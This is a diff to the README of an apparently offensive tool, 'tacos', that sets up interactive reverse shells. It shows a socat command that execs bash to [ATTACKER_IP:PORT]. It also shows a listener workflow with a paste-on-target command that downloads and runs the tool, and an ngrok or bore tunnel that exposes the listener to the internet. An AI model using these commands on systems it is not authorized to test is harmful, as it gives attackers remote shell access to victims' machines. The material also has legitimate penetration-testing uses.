@@ -30,23 +30,21 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 
 ## Usage
 
-`tacos` is built to work with the simple and dramatically effective project [`pty4all`](https://github.com/laluka/pty4all):
+« I quicly want an interactive reverse shell», take a wrap! 🥙
 ```shell
 # On attacker machine
 tmux
-./light-pty4all/socat-listener.sh --lhost [ATTACKER_IP] --lport [ATTACKER_PORT] #multi-handler
+wrap --lhost [ATTACKER_IP] #launch socat listener + output command to run on target
 
-# On target (transfer tacos as you wish)
-./tacos [ATTACKER_IP]:[ATTACKER_PORT]       # or .\tacos.exe [ATTACKER_IP]:[ATTACKER_PORT] for windows
-# 💥
+# On target
+# paste command outputted by wrap: it will download tacos, and launch it to obtain the interactive revshell
 ```
 
 <details>
 <summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
 Useful if target can't directly reach the attacker machine, but has internet access
 <br> On attacker machine, install <code>ngrok</code> or <code>bore</code> and launch your listener:
-<pre><code>
-./light-pty4all/socat-listener-behind-tunneling.sh
+<pre><code>wrap -n
 </code></pre>
 
 <i><b>N.B:</b></i> ngrok is more stable than bore for now
@@ -87,24 +85,33 @@ mount /dev/sda1 /mnt/hostfs
 </blockquote>
 </details>
 
-## Install
 
-### Docker
+## Install
+### tacos
+#### Docker
 ```shell
 docker pull ariary/tacos
 ```
 
-### Release
+#### Release
 ```shell
 curl -lO -L -s https://github.com/ariary/tacos/releases/latest/download/tacos && chmod +x tacos
 ```
 
-### From git
+#### From git
 need `go`:
 ```shell
 git clone https://github.com/ariary/tacos.git && cd tacos
 make before.build
 make build.tacos          # or make build.tacos.windows
+```
+
+### wrap
+need `nim`:
+
+```shell
+git clone https://github.com/ariary/tacos.git && cd tacos
+make build.wrap 
 ```
 
 ## Alternatives
